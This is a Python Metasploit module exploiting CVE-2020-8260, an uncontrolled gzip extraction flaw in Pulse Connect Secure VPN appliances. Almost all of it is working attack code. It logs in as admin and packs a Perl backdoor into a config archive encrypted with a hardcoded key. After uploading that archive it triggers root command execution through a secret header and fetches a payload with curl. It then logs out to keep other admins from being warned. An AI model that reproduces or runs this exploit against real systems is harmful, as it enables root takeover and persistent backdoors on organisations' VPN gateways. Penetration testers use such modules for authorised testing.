#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# standard modules
import logging
import re
import io
import os
import sys
import tarfile
import hashlib
import struct
import argparse
import random
import string
import time

# extra modules
dependencies_missing_requests = False
dependencies_missing_cipher = False
try:
    import requests
except ImportError:
    dependencies_missing_requests = True

try:
    from M2Crypto.EVP import Cipher
except ImportError:
    dependencies_missing_cipher = True

from metasploit import module


metadata = {
    'name': 'Pulse Secure VPN gzip RCE',
    'description': '''
        The Pulse Connect Secure appliance before 9.1R9 suffers from an uncontrolled gzip extraction vulnerability
        which allows an attacker to overwrite arbitrary files, resulting in Remote Code Execution as root.
        Admin credentials are required for successful exploitation.
        Of note, MANY binaries are not in `$PATH`, but are located in `/home/bin/`
        If the cmd variable is set, that command will be run instead of a full metasploit payload.
    ''',
    'authors': [
        'h00die', # msf module
        'Richard Warren <richard.warren@nccgroup.com>', # original PoC, discovery
        'David Cash <david.cash@nccgroup.com>', # original PoC, discovery
    ],
    'date': '2020-10-26',
    'license': 'MSF_LICENSE',
    'rank': 'excellent',
    'privileged': True,
    'targets': [
      {'platform':'linux', 'arch': 'x86'}
    ],
    'payload': {
        'command_stager_flavor': 'curl',
    },
    'references': [
        {'type': 'url', 'ref': 'https://gist.github.com/rxwx/03a036d8982c9a3cead0c053cf334605'},
        {'type': 'url', 'ref': 'https://research.nccgroup.com/2020/10/26/technical-advisory-pulse-connect-secure-rce-via-uncontrolled-gzip-extraction-cve-2020-8260/'},
        {'type': 'url', 'ref': 'https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44601'},
        {'type': 'cve', 'ref': '2020-8260'}
    ],
    'type': 'remote_exploit_cmd_stager',
    'options': {
        'targeturi': {'type': 'string', 'description': 'The base path', 'required': True, 'default': '/'},
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'rport': {'type': 'int', 'description': 'Target port', 'required': True, 'default': 443},
        'username': {'type': 'string', 'description': 'Admin username', 'required': True, 'default': 'admin'},
        'password': {'type': 'string', 'description': 'Admin password', 'required': True, 'default': '123456'},
        'cmd': {'type': 'string', 'description': 'OVERRIDE target, run a single command if not blank', 'required':False, 'default': ''}
    },
}

######## this block is pulled directly from Richard Warren's git page.  I reached out to them to ask about 'configdecrypt' and they sent
######## this back.  Big thanks to them for sending over code!  Any changes was just to work in memory and not the filesystem and was
######## left commented

HARDCODED_KEY = bytes.fromhex("5075E9C43151227C20738D002CEECFA22C6C274F07815E94BC513AD45D611A533C5751C1CBEE7769ECC98102E5233AAC00")
TRIPLE_DES_KEY_SIZE = 24

def evp_bytestokey(password, key_len):
    d = d_i = b''
    while len(d) < key_len:
        d_i = hashlib.md5(d_i + password).digest()
        d += d_i
    return d[:key_len]


def parse_encrypted_config(filename):
    key = iv = ciphertext = ''
    #f = open(filename, 'rb')
    # we pass the file directly in, original implementation took it from disk
    f = filename
    #f.seek(1)
    key = HARDCODED_KEY
    #iv = f.read(8)
    iv = f[1:9]
    #f.seek(1, 1) # 00 byte here, means hardcoded key
    #size = struct.unpack('<i', f.read(4))[0]
    size = struct.unpack('<i', f[10:14])[0]
    logging.info('size: {}'.format(size))
    #ciphertext = f.read(size)
    ciphertext = f[14:14+size]
    #f.close()
    return key, iv, ciphertext


def pack_encrypted_config(ciphertext, iv):
    packed = io.BytesIO()
    packed.write(b'\x09') # hardcoded key
    packed.write(iv)
    packed.write(b'\x00') # hardcoded key
    packed.write(struct.pack('<i', len(ciphertext)))
    packed.write(ciphertext)
    return packed.getvalue()

########
########

# return host, port, uri in one shot to save code later on
def hpu(args):
    return 'https://{}:{}{}'.format(args['rhost'], args['rport'], args['targeturi'])


def encrypt_config(file):
    plaintext = file.getvalue()

    key_bytes = evp_bytestokey(HARDCODED_KEY, TRIPLE_DES_KEY_SIZE)
    iv = os.urandom(8)
    logging.info("    [*] Key: %s" % key_bytes.hex())
    logging.info("    [*] IV: %s" % iv.hex())

    h = hashlib.md5()
    h.update(iv)
    h.update(b'\x00')
    h.update(struct.pack('<i', len(plaintext)))

    cipher = Cipher(alg='des_ede3_cfb', key=key_bytes, op=1, iv=iv, salt='')
    ciphertext = cipher.update(plaintext)
    ciphertext += cipher.final()
    h.update(ciphertext)

    logging.info("    [+] Encrypted header: %s" % ciphertext.hex()[0:8])
    packed = pack_encrypted_config(ciphertext, iv)

    # encrypt the md5 hash and append to ciphertext
    cipher = Cipher(alg='des_ede3_cfb', key=key_bytes, op=1, iv=iv, salt='')
    logging.info("    [*] Digest: %s" % h.hexdigest())
    ciphertext = cipher.update(h.digest())
    ciphertext += cipher.final()
    packed += ciphertext
    logging.info("    [*] Hash: %s" % packed.hex()[-32:])
    return packed


def upload_config(args,s, config):
    logging.info('Requesting backup config page')
    # referer is required or else you get a 'read-only' page where btnUpload has the attribute 'disabled'
    res = s.get('{}dana-admin/cached/config/config.cgi?type=system'.format(hpu(args)),
              verify = False, allow_redirects = False,
              headers = {'referer': '{}dana-admin/cached/config/config.cgi?type=system'.format(hpu(args))})

    xsauth = re.search('name="xsauth" value="(?P<xsauth>[^"]+)"\/>', res.text)
    if xsauth is None:
        logging.error('Unable to detect fds or xsauth fields')
        return
    xsauth = xsauth.groupdict()['xsauth']

    logging.info('Uploading encrypted config backup')
    res = s.post('{}dana-admin/cached/config/import.cgi'.format(hpu(args)),
              verify = False, allow_redirects = False,
              headers = {'referer': '{}dana-admin/cached/config/config.cgi?type=system'.format(hpu(args))},
              data =
                  {
                      'xsauth': xsauth,
                      'op': 'Import',
                      'type': 'system',
                      'optWhat': '8',
                      'txtPassword1': '',
                      'btnUpload': 'Import Config'
                  },
              files = {'uploaded_file': ('system.cfg', config, 'application/octet-stream')}, #system.cfg is the default export name
              )
    return res.content


def login(args, s):
    try:
        login_url = '{}dana-na/auth/url_admin/login.cgi'.format(hpu(args))
        logging.info('Attempting login to: {}'.format(login_url))
        res = s.post(login_url, verify = False, allow_redirects = False,
            data =
                {
                    'tz_offset': '-300',
                    'username': args['username'],
                    'password': args['password'],
                    'realm': 'Admin Users',
                    'btnSubmit': 'Sign In'
                })
    except requests.exceptions.RequestException as e:
        logging.error('{}'.format(e))
        quit()
    if res.status_code != 302:
        logging.error("Received non 302 response ({}), check URL".format(res.status_code))
        quit()
    if 'failed' in res.headers['Location']:
        logging.error("Login failed. Check credentials")
        quit()
    # if the account we login with is already logged in, or another admin is logged in, a warning is displayed.  Click through it.
    if 'admin%2Dconfirm' in res.headers['Location']:
        logging.info('Other admin sessions detected, continuing.')
        # Location should contain the URI, so we dont use the hpu shortcut here.
        res2 = s.get('https://{}:{}{}'.format(args['rhost'], args['rport'],
            res.headers['Location']), verify = False, allow_redirects = False)
        fds = re.search('name="FormDataStr" value="(?P<fds>[^"]+)">', res2.text)
        xsauth = re.search('name="xsauth" value="(?P<xsauth>[^"]+)"\/>', res2.text)
        if fds is None or xsauth is None:
            logging.error('Unable to detect fds or xsauth fields')
            quit()
        fds = fds.groupdict()['fds']
        xsauth = xsauth.groupdict()['xsauth']
        res2 = s.post('{}dana-na/auth/url_admin/login.cgi'.format(hpu(args)),
            verify = False, allow_redirects = False,
            data = {'btnContinue': 'Continue the session', 'FormDataStr': fds, 'xsauth': xsauth})


def find_version(args, s):
    try:
        r = s.get('{}dana-admin/misc/admin.cgi'.format(hpu(args)),
            verify = False, allow_redirects = False)
    except requests.exceptions.RequestException as e:
        logging.error('{}'.format(e))
        quit()
    v = re.search('<span id="span_stats_counter_total_users_count"[^>]+>(?P<version>[^<(]+)(?:\(build (?P<build>\d+)\))?<\/span>',r.text)
    if v:
        version = v.groupdict()['version'].strip()
        if 'R' in version:
            revision = version.split('R')[1]
            version = version.split('R')[0]
        else:
            revision = ''
        build = v.groupdict()['build'].strip()
        logging.info("Version {}, revision {}, build {} found".format(version, revision, build))
        if float(version) <= 9.1 and float(revision) < 9:
            logging.info('Version is vulnerable')
            return
        logging.error('Version not vulnerable')
        quit()


# Check methods aren't supported for external, but we use the name anyways for consistency
def check(args, s):
    login(args, s)
    logging.info('Finding Version')
    find_version(args, s)


def run(args):
    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))

    if dependencies_missing_requests:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return
    if dependencies_missing_cipher:
        logging.error('Module dependency (M2Crypto) is missing, cannot continue.  Try apt-get install python3-m2crypto on Ubuntu/Kali')
        return

    s = requests.Session()

    check(args, s)
    f_memory_new = io.BytesIO()
    new_config = tarfile.open(fileobj = f_memory_new, mode='w|gz')
    trigger = ''.join(random.choice(string.ascii_uppercase) for i in range(8))
    logging.info('Exploit trigger will be at {}dana-na/auth/setcookie.cgi with a header of {}'.format(hpu(args),trigger))
    try:
        if args['cmd']:
            cmd = '''if( length $ENV{{HTTP_PULSE_CMD}}){{
   system("{}");
}}'''.format(args['cmd'])

        else:
            logging.info(args['command'])
            full_command = args['command'].split(';')
            curl = full_command[0]
            payload_file = full_command[0].split(' ')[2].strip()
            cmd = '''if( length $ENV{{HTTP_PULSE_CMD}}){{
   system("/home/bin/{}");
   chmod 0777, "{}";
   system("env {}");
}}'''.format(curl, payload_file, payload_file, payload_file, payload_file)

        cmd = cmd.replace('PULSE_CMD', trigger)
        logging.info('Perl code being injected\n{}'.format(cmd))
        backdoor = io.BytesIO(cmd.encode('utf-8'))
    except:
        logging.error('Error creating backdoor {} -> {}'.format(sys.exc_info()[0], sys.exc_info()[1]))
    try:
        f1 = tarfile.TarInfo(name = 'tmp')
        f1.type = tarfile.DIRTYPE
        f1.mode = 509
        f1.mtime = time.time()
        new_config.addfile(f1)
        f2 = tarfile.TarInfo(name = 'tmp/tt')
        f2.type = tarfile.DIRTYPE
        f2.mode = 509
        f2.mtime = time.time()
        new_config.addfile(f2)
        bd = tarfile.TarInfo(name = 'tmp/tt/setcookie.thtml.ttc')
        bd.size = backdoor.getbuffer().nbytes
        bd.mtime = time.time()
        bd.mode = 511
        new_config.addfile(tarinfo=bd, fileobj=backdoor)
    except:
        logging.error('Error adding backdoor to gzip{} -> {}'.format(sys.exc_info()[0], sys.exc_info()[1]))
    logging.info('Encrypting config with exploit backdoor')
    new_config.close()
    try:
        enc_new_config = encrypt_config(f_memory_new)
    except:
        logging.error('Error encrypting {} -> {}'.format(sys.exc_info()[0], sys.exc_info()[1]))
        return
    content = upload_config(args, s, enc_new_config)
    content = content.decode('ascii')
    # grab the logout url out of the content here
    logout = re.search('window.location.href = "\/(?P<logout>dana-na\/auth\/logout.cgi\?xsauth=.+)"', content)
    if logout:
        logout = logout.groupdict()['logout'].strip()
    else:
        logging.error("Couldn't find logout :(")
        logout = None
    if 'Access Error' in content:
        logging.info('Logging out to prevent warnings to other admins')
        res = s.get('{}{}'.format(hpu(args), logout),
            verify = False, allow_redirects = False)
        return
    logging.info('Triggering RCE')
    try:
        res = s.get('{}dana-na/auth/setcookie.cgi'.format(hpu(args)),
            verify = False, allow_redirects = False,
            headers = {trigger: trigger}, timeout = 3)
    except requests.exceptions.ConnectionError:
        logging.info('Request timed out, most likely due to obtaining a session!')

    try:
        logging.info('Command Output: \n{}'.format(res.content.decode('utf-8').split('\n\n<html>')[0]))
    except:
        # no output, most likely because res.content is nothing since the request timed out from a good session
        pass
    logging.info('Logging out to prevent warnings to other admins')
    if not logout is None:
      res = s.get('{}{}'.format(hpu(args), logout),
          verify = False, allow_redirects = False)


if __name__ == '__main__':
    module.run(metadata, run)
